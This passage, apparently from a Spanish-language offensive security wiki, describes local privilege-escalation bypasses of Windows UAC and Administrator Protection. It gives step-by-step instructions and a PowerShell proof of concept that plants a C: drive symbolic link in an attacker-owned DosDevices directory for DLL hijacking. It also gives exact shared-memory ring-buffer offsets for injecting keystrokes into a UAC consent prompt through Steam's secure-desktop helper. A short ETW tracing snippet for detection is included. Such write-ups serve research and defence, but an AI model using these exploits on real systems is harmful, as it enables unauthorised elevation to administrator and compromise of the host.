../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” usa tokens de shadow-admin con mapas `\Sessions\0\DosDevices/<LUID>` por sesión. El directorio se crea de forma diferida mediante `SeGetTokenDeviceMap` durante la primera resolución de `\??`. Si el atacante suplanta el token de shadow-admin solo en el nivel **SecurityIdentification**, el directorio se crea con el atacante como **propietario** (hereda `CREATOR OWNER`), lo que permite crear enlaces de letras de unidad que tienen prioridad sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Pasos:**

1. Desde una sesión con pocos privilegios, llama a `RAiProcessRunOnce` para iniciar un `runonce.exe` shadow-admin sin mostrar ningún aviso.
2. Duplica su token principal como un token de **identificación** y suplántalo mientras abres `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo la propiedad del atacante.
3. Crea allí un enlace simbólico `C:` que apunte a almacenamiento controlado por el atacante; los accesos posteriores al sistema de archivos en esa sesión resolverán `C:` a la ruta del atacante, lo que permite el secuestro de DLL/archivos sin mostrar ningún aviso.

**PoC de PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

En hosts de vista previa, Administrator Protection registra las aprobaciones y los errores como eventos ETW **15031** y **15032** en el proveedor `Microsoft-Windows-LUA`. Los eventos incluyen el SID del solicitante, la ruta de la aplicación, el resultado, la cuenta de administrador administrada y el método de autenticación, por lo que los intentos repetidos de exploit o los intentos fallidos de manipular la interfaz no pasan inadvertidos para la telemetría.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Entrada del escritorio seguro reenviada mediante un búfer circular de memoria compartida con permisos de escritura

Un helper del escritorio seguro puede socavar el aviso de UAC si un usuario con integridad media puede escribir en su IPC de entrada. En el diseño de Steam descrito, `IClientSecureDesktop::BStartStreaming` inicia `secure_desktop_capture.exe` como SYSTEM en `winsta0\winlogon`. Expone `Global\SecureDesktopInput_mem-IPCWrapper` con acceso `GENERIC_ALL` para el usuario; el helper consume las entradas del búfer circular y llama a `SendInput` en el escritorio seguro. Esto es distinto de UIAccess o de cambiar `PromptOnSecureDesktop`: la entrada la reenvía un proceso que ya se está ejecutando allí. Consulta [el inicio del IPC del servicio](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) para ver cómo el cliente llega a este handler. <sup>[[15]](#references)[[16]](#references)</sup>

El búfer circular tiene 128 ranuras de 173 bytes. Sus contadores de escritura y lectura están en `0x414` y `0x418`, y la ranura `N` está en `0x41c + 173*N`. Establece el primer byte de la ranura en `0` para indicar texto sin cifrar, copia inmediatamente después una estructura `INPUT` de Windows de 40 bytes y luego incrementa el contador de escritura. Para un administrador con integridad media que se enfrenta a un aviso de consentimiento, una pulsación de tecla `Y` (tecla abajo/tecla arriba) puede activar el control afirmativo de UAC después de iniciar un ejecutable que solicite elevación; no puede responder a un aviso de credenciales de un usuario estándar. La **autorización de consentimiento sigue siendo necesaria**: el helper reenvía la entrada solo después de que el usuario haya aprobado el aviso `InputEnabled` para el período de autorización actual de 90 días. Que una asignación sea legible y escribible no demuestra por sí solo que la entrada llegue al aviso; compara el contador de lectura antes y después de una prueba controlada. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cómo funciona el Control de cuentas de usuario](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Colección de técnicas para omitir UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Analizador de compatibilidad y lanzador para omitir UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopta la IA para generar puertas traseras de PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operación TrueChaos: explotación de día cero contra objetivos gubernamentales del sudeste asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Cómo omitir la protección del administrador de Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Omitir UAC mediante la tarea SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Métodos para omitir UnifiedConsent, TabTip y Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protección del administrador](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Llamadas a servidores RPC locales de Windows desde .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte mejora CoolClient con un rootkit de kernel de Windows firmado](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: un troyano de Windows completamente indetectable diseñado para espiar, robar y aterrorizar](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC de Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
